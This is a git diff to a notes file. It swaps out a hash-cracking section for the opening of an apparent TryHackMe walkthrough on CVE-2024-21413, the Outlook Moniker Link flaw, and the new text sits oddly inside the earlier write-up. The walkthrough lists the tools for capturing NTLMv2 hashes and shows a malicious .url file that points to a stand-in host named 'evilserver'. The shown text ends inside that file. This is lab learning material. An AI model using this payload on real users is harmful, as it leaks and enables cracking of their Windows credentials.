@@ -1429,7 +1429,52 @@ The exercises included cracking different types of files and hashes, reinforcing
 
 ## Commands Used
 
-### Basic Hash Cracking
-```bash
 
+# TryHackMe - Moniker Link (CVE-2024-21413) Walkthrough
+
+> **Room:** [Moniker Link (CVE-2024-21413)](https://tryhackme.com/room/monikerlink)  
+> **Category:** Exploitation / CVEs  
+> **Author:** TryHackMe  
+> **Difficulty:** Medium  
+> **Date Completed:** April 29, 2025  
+> **CVE:** CVE-2024-21413
+
+---
+
+## 📌 Description
+
+This TryHackMe room covers **CVE-2024-21413**, a vulnerability affecting Microsoft Outlook that allows attackers to leak NTLM hashes via **.url** files containing **Moniker links**. The lab demonstrates how improper handling of specially crafted links can lead to NTLM hash exfiltration and further compromise.
+
+---
+
+## 🧠 Objectives
+
+- Understand the mechanics of the Moniker Link vulnerability.
+- Create a malicious `.url` file.
+- Set up a responder or similar tool to capture NTLMv2 hashes.
+- Analyze and potentially crack captured hashes.
+- Understand mitigation techniques.
+
+---
+
+## 🛠 Tools Used
+
+- `Responder` (hash capture)
+- `Python HTTP Server` (host the .url file)
+- `Hashcat` (NTLMv2 hash cracking)
+- Wireshark (optional for packet analysis)
+- Kali Linux (attacker environment)
+- TryHackMe AttackBox
+
+---
+
+## 🧪 Lab Steps
+
+### 1. 📄 Create Malicious `.url` File
+
+Create a `.url` file containing a moniker link:
+
+```ini
+[InternetShortcut]
+URL=man://evilserver/thief
 
